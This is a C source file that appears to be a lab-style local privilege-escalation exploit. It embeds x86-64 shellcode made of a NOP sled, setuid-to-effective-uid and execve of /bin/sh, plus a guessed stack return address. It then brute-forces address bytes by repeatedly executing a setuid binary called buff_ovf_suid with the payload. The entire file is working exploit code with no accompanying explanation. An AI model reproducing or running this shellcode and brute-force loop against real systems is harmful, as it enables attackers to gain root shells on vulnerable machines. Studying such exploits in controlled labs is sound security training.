#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main(int argc, char *argv[]) {
    // Crear el payload similar al generado por el comando Python
    /*char payload[] =
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x48\x31\xc0\xb0\x6b\x0f\x05\x48\x89\xc7"
        "\xb0\x69\x0f\x05\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69"
        "\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"
        "\x90\x90\x90\x90\x90\x90\x90\x90\xd0\xe1\xff\xff\xff\x7f";*/
    unsigned char payload[] = {
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x31,
        0xc0, 0xb0, 0x6b, 0x0f, 0x05, 0x48, 0x89, 0xc7,
        0xb0, 0x69, 0x0f, 0x05, 0xb0, 0x3b, 0x48, 0x31,
        0xff, 0x57, 0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69,
        0x6e, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7,
        0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0xd0, 0xe1, 0xff, 0xff, 0xff, 0x7f
    };
    
    char *new_argv[] = { "./buff_ovf_suid", payload, NULL };
    
    int status;
    for (payload[73]=0xe0; payload[73]<0xef; payload[73]+=0x01)
    for (payload[72]=0x00; payload[72]<0xf8; payload[72]+=0x08) {
        pid_t pid = fork();
        if (pid == 0) {
            printf("%x %x\n", payload[72], payload[73]);
            execv(new_argv[0], new_argv);
            exit(1);
        }
        //printf("%x\n", payload[72]);
        waitpid(-1, &status, 0);
    }

    return 0;
}